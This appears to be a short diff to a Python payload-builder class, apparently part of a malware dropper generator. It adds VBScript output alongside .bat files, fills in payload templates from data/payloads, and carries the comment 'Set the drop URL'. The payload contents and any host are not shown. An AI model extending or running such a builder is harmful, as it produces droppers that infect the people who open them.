@@ -4,17 +4,23 @@ import os
 
 class Build :
 
-	def __init__(self, extension) :
+	def __init__(self, extension, filetype) :
 		self.extension = extension
+		self.filetype = filetype
 
 	def Builder(self) :
 
-		path = "output/builds/" # Builds file
-		payload = "data/payloads/powershell/powershell.txt" # Payload file
-		build = "{}{}".format(self.extension, ".bat") # Make .bat file
+		path = "output/builds/" # Builds files
+
+		if self.filetype == "bat":
+			payloads = "data/payloads/powershell/powershell.txt" # Payload file
+		elif self.filetype == "vbs" :
+			payloads = "data/payloads/VBScript/vbs.txt" # Payload file
+			
+		build = "{}.{}".format(self.extension, self.filetype) # Make .bat file
 		
 		try:
-			with open(payload, 'rb') as f :
+			with open(payloads, 'rb') as f :
 				# Set the drop URL
 				with open(os.path.join(path, build), 'wb') as builder :
 					# Write the new file
